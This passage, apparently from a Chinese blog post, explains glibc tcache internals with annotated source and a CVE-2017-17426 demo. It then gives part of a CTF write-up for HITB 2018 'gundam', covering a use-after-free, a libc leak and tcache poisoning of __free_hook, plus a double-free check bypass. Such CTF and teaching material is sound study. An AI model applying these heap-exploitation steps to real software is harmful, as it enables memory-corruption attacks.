chunk。</span><br><span class="line"> *  需要注意的是这里的 next 指向 chunk 的 user_data ，而 fastbin 的 fd 指向 chunk 开头(prev_size)的地址。</span><br><span class="line"> *  而且，tcache_entry 会复用空闲 chunk 的 user_data 部分。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">// tcache_perthread_struct位于堆的开头，大小为0x250。  </span><br><span class="line">typedef struct tcache_perthread_struct &#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];              //用于存放bins中的chunk数量。</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];    //用于存放64个bins地址</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line"> /* </span><br><span class="line"> *    每个 thread 都会维护一个 tcache_perthread_struct，一共有 TCACHE_MAX_BINS 个计数器和 TCACHE_MAX_BINS 项 tcache_entry,</span><br><span class="line"> *  ·tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free后）的 chunk。</span><br><span class="line"> *  ·counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></div>

<p>  每个线程默认<strong>64</strong>个单链表结构的bins，每个bins最多存放<strong>7</strong>个chunk。chunk在64位机器以16字节递增，从24到1032字节。在32位机器上以8字节递增，从12到512字节。因此tcache只能存放<strong>non-large</strong>的chunk。</p>
<p>图解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3VXXSF45THTQ63W.jpg"
                      alt="img"
                ></p>
<h1 id="Tcache实现"><a href="#Tcache实现" class="headerlink" title="Tcache实现"></a>Tcache实现</h1><h2 id="Tcache初始化"><a href="#Tcache初始化" class="headerlink" title="Tcache初始化"></a>Tcache初始化</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">tcache_init(void)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  void *victim = 0;</span><br><span class="line">  const size_t bytes = sizeof (tcache_perthread_struct); //大小为0x240</span><br><span class="line"></span><br><span class="line">  if (tcache_shutting_down)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  /* 使用_int_malloc为 tcache_perthread_struct 分配内存 */</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  /* 分配失败则再次尝试分配 */</span><br><span class="line">  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  /* __libc_lock_unlock 是一个宏，用于释放一个互斥锁 */</span><br><span class="line">  if (ar_ptr != NULL)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      /* 转换为tcache_perthread_struce结构 */</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      /* 初始为0 */</span><br><span class="line">      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="分配堆块时"><a href="#分配堆块时" class="headerlink" title="分配堆块时"></a>分配堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26没有对放入的chunk进行严格校验的，也没有把P位置零 */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  /* 放在头部，和插入fastbin的插入形式是一致的 */</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*    malloc出来的chunk为fast chunk，</span><br><span class="line">*  那么fastbin中相应大小的chunk会被放入tcache相应大小的tcache bins中，</span><br><span class="line">*  直到相应的tcache bins满7个或者相应的fastbins为空。</span><br><span class="line">*  chunk在tcache bin中顺序与fastbin相反</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                 &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*   malloc出来的chunk是small chunk。和fast chunk类似。</span><br><span class="line">*      但是会对每一个chunk的next_chunk的prev_inuse位设置为1。</span><br><span class="line">*   chunk在tcache bin中顺序与small bin中顺序相同。</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line">          </span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  bck = tc_victim-&gt;bk;</span><br><span class="line">                  /* 设置标志位 */</span><br><span class="line">                  set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                  bin-&gt;bk = bck;</span><br><span class="line">                  bck-&gt;fd = bin;</span><br><span class="line">    </span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">/*  </span><br><span class="line">*    如果unsorted chunk跟要用户所需要chunk大小一致，那么会优先将该chunk挂入对应的tcache中，并不直接返回</span><br><span class="line">*/</span><br><span class="line">          if (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                  if (tcache_nb</span><br><span class="line">                      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">                    &#123;</span><br><span class="line">                      tcache_put (victim, tc_idx);</span><br><span class="line">                      return_cached = 1;</span><br><span class="line">                      continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">#endif</span><br><span class="line">                  check_malloced_chunk (av, victim, nb);</span><br><span class="line">                  void *p = chunk2mem (victim);</span><br><span class="line">                  alloc_perturb (p, bytes);</span><br><span class="line">                  return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                    &#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="从Tcache取出堆块"><a href="#从Tcache取出堆块" class="headerlink" title="从Tcache取出堆块"></a>从Tcache取出堆块</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26取出chunk并没有严格的检查，由于tcache优先级很高，所以其他的检查机制并没有对tcache发挥过多作用 */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  /* 取出chunk */</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  /* counts记录相应bins的chunk数量,取出时减一 */</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">* 如果用户需要的chunk size 属于 non-large chunk并且 tcache 已经初始化并且对应tcache bins中有符合chunk则取出</span><br><span class="line">* 注意从tcache中取出块是在进入_int_malloc()之前的</span><br><span class="line">*/</span><br><span class="line">if (tc_idx &lt; mp_.tcache_bins </span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  return tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">*   在unsorted bin最后，如果找到了可以返回的块，</span><br><span class="line">*   并且mp_.tcache_unsorted_limit次数小于处理unsorted count(即tcache中装满了对应的chunk)</span><br><span class="line">*   那么就会从其中拉出一个chunk出来返回</span><br><span class="line">*/</span><br><span class="line">.tcache_unsorted_limit = 0 </span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">     filling the cache, return one of the cached ones.  */</span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      if (return_cached</span><br><span class="line">      &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">      &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*  </span><br><span class="line">*    在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk</span><br><span class="line">*    那么在遍历unsorted bin之后则调用一次tcache_get返回给用户使用 </span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    if (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="释放堆块时"><a href="#释放堆块时" class="headerlink" title="释放堆块时"></a>释放堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* </span><br><span class="line">*    如果tcache已经初始化</span><br><span class="line">*    并且free的chunk属于non-large chunk</span><br><span class="line">*    如果free的chunk对应的tcache链未满7个 </span><br><span class="line">*    那么就将chunk放入到tcahce中缓存</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>释放堆块时：如果chunk是<strong>non-large chunk</strong>，并且对应bins未满7个，则放入对应bins。</p>
</li>
<li><p>分配堆块时：</p>
<p>（1）如果fastbins或者small bins中成功返回一个需要的chunk，那么对应fastbins或者small bins中的剩余chunk会被放进相应的tcache  bin中，直到相应tcache bin填满7个或者对应的fastbins或者small bins为空。<strong>chunk在tcache bin中顺序与fastbin相反，与small bin中顺序相同。</strong></p>
<p>（2）unsorted bin 中符合用户要求的的chunk取出时，chunk 合并等其他操作，每一个符合要求的chunk会<strong>优先放入tcache</strong>，然后从 tcache 中返回其中一个。如果tcache已满则直接返回。</p>
</li>
<li><p>从tcache中取出堆块。</p>
<p>（1）<strong>在__libc_malloc()调用_int_malloc()前</strong>，如果tcache bin中有符合要求的chunk，则直接返回。</p>
<p>（2）**(默认不执行)**。在unsorted bin最后如果找到了可以返回的块，并且 <strong>mp_.tcache_unsorted_limit(默认为0)</strong> 次数小于处理 unsorted count(即tcache中装满了对应的chunk)那么就会从其中拉出一个chunk出来返回。</p>
<p>（3）在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk 那么在<strong>遍历unsorted bin</strong>之后，则调用一次<strong>tcache_get</strong>返回给用户使用。</p>
</li>
<li><p>tcache中的chunk不会合并。chunk的prev_inuse&#x3D;1。</p>
</li>
</ol>
<h1 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h1><h2 id="cve-2017-17426"><a href="#cve-2017-17426" class="headerlink" title="cve-2017-17426"></a>cve-2017-17426</h2><p>  __libc_malloc()使用request2size()转换堆块为实际大小时，不会进行整数溢出检查。请求一个接近(SIZE_MAX)的堆块将导致溢出，使malloc错误返回tcache bin中的堆块。</p>
<p>源码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    void *x = malloc(10);</span><br><span class="line">    printf(&quot;malloc(10): %p\n&quot;,x);</span><br><span class="line">    free(x);</span><br><span class="line">    </span><br><span class="line">    void *y = malloc(((size_t)~0) - 2);</span><br><span class="line">    printf(&quot;malloc(((size_t)~0) - 2): %p\n&quot;,y);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用glibc-2.26的输出，分配成功。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J423U7BS3AVPUMN.jpg"
                      alt="img"
                ></p>
<p>使用glibc-2.27的输出，nil说明漏洞已修复。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GYTCUQJPMZ3ZT9S.jpg"
                      alt="img"
                ></p>
<h2 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h2><p>glibc-2.29新增加double free检查，方法是在tcache_entry结构体中新增加标志位key来检查chunk是否在tcache bin中。当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 double Free 报错。因为chunk的key保存在bk位置，只需将其修改即可绕过double free检查。</p>
<h1 id="经典赛题（已提供相关附件）"><a href="#经典赛题（已提供相关附件）" class="headerlink" title="经典赛题（已提供相关附件）"></a>经典赛题（已提供相关附件）</h1><p>说明：附件中的赛题已经用patchelf改好环境。</p>
<h2 id="HITB-CTF-2018-gundam"><a href="#HITB-CTF-2018-gundam" class="headerlink" title="HITB CTF 2018: gundam"></a>HITB CTF 2018: gundam</h2><p><strong>1.修改rpath。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5UPXC4BVAGDJUG8.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护。</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7UJ686BG6C4DDVJ.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行。</strong></p>
<p>可见为菜单题。</p>
<p>1-创建一个gundam机器人</p>
<p>2-访问gundamu</p>
<p>3-销毁一个gundam</p>
<p>4-炸毁工厂</p>
<p>5-退出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YJXK6788EQ5JJG9.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析。</strong></p>
<p>1-分析Build函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Build()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  void *s; // [rsp+8h] [rbp-18h]</span><br><span class="line">  void *buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  s = 0LL;</span><br><span class="line">  buf = 0LL;</span><br><span class="line">  if ( (unsigned int)dword_20208C &lt;= 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    s = malloc(0x28uLL);</span><br><span class="line">    memset(s, 0, 0x28uLL);</span><br><span class="line">    buf = malloc(0x100uLL);</span><br><span class="line">    if ( !buf )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;error !&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;The name of gundam :&quot;);</span><br><span class="line">    //buf记录名字，没有&#x27;\x00&#x27;限制可能泄露</span><br><span class="line">    read(0, buf, 0x100uLL);</span><br><span class="line">    // (s+8)位置 -&gt; buf</span><br><span class="line">    *((_QWORD *)s + 1) = buf;</span><br><span class="line">    printf(&quot;The type of the gundam :&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    //type &lt; 3</span><br><span class="line">    if ( v1 &gt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    // (s+16) -&gt; type</span><br><span class="line">    strcpy((char *)s + 16, &amp;aFreedom[20 * v1]);</span><br><span class="line">    // s-&gt;1 标记为在使用。</span><br><span class="line">    *(_DWORD *)s = 1;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !qword_2020A0[i] )</span><br><span class="line">      &#123;</span><br><span class="line">          //Factory[9]，工厂数组。</span><br><span class="line">        qword_2020A0[i] = s;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 换原为NumOfGundam，记录gundam的数量</span><br><span class="line">    ++dword_20208C;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不难分析出gundam结构体</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct gundam&#123;</span><br><span class="line">    int flag;</span><br><span class="line">    char *buf;</span><br><span class="line">    char type[60];</span><br><span class="line">&#125;gundam;</span><br><span class="line">struct gundam *factory[9]</span><br></pre></td></tr></table></figure></div>

<p>2-Visit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Visit()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        //将每个gundma的buf和Type打印出来。</span><br><span class="line">      if ( factory[i] &amp;&amp; *(_DWORD *)factory[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;\nGundam[%u] :%s&quot;, i, *(const char **)(factory[i] + 8LL));</span><br><span class="line">        printf(&quot;Type[%u] :%s\n&quot;, i, (const char *)(factory[i] + 16LL));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam produced!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-Destroy函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Destroy()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Which gundam do you want to Destory:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    if ( v1 &gt; 8 || !factory[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    // 使用标记置为0</span><br><span class="line">    *(_DWORD *)factory[v1] = 0;</span><br><span class="line">    // name存在UAF漏洞。</span><br><span class="line">    free(*(void **)(factory[v1] + 8LL));</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  // 并没有将NumOfGundam数量-1</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-BlowUp函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 BlowUp()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( factory[i] &amp;&amp; !*(_DWORD *)factory[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      free((void *)factory[i]);</span><br><span class="line">      factory[i] = 0LL;</span><br><span class="line">      // 只把标记为置为0，存在uaf。</span><br><span class="line">      --NumOfGundam;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并。可以看到unsorted bin中的chunk的fd和bk指向了一个栈地址(main_arena+88)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZEASEE9NZU44C5S.jpg"
                      alt="img"
                ></p>
<p>blow up后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_79F5P5RSTUVS4CX.jpg"
                      alt="img"
                ></p>
<p>计算这个栈地址与libc基地址的偏移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_H876K6X845YEQTM.jpg"
                      alt="img"
                ></p>
<p>偏移为：0x3dac78</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BMEDZ8WHXWHZ6GA.jpg"
                      alt="img"
                ></p>
<p>在申请8个chunk，将unsorted bin中的chunk申请出来，再利用visit()函数泄露main_arena+88处的栈地址。</p>
<p>此时需要注意，chunk优先从tcache取出，然后Type[7]才是unsorted bin中的chunk。由于第8个chunk的fd指向main_arena+88处的地址，</p>
<p>所以此时只需要接收6个字节（因为64位栈地址前2字节为’\x00’,并且用%s打印地址）然后用’\x00’补齐即可。</p>
<p>再用main_arena+88处的地址减去上面计算出的固定偏移即可得到栈的基地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_82AMDYGDZBJYGEX.jpg"
                      alt="img"
                ></p>
<p>进而可以由libc-2.26.so得到system和__free_hook地址。</p>
<p>（2）利用double free制造tcache poisoning到&amp;__free_hook</p>
<p>依次释放2，1，0，0。此时tcache bin状态如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_R5CPWZN2CM9D8X6.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5NNQRGXBK3K8GET.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4FZWRZH9EK2D29U.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XQ7DM265PKATFMY.jpg"
                      alt="img"
                ></p>
<p>blow up 后</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AKAUSN3ZH6Q75K6.jpg"
                      alt="img"
                ></p>
<p>已经形成了double free。此时在申请一个堆块将会把chunk0申请出来，将其内容改为__free_hook的地址。</p>
<p>因为此时chunk0依然在tcache bin(0x110)的链上，所以__free_hook会被挂在tcache bins的链上。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRCZDXZ7HZPPG3A.jpg"
                      alt="img"
                ></p>
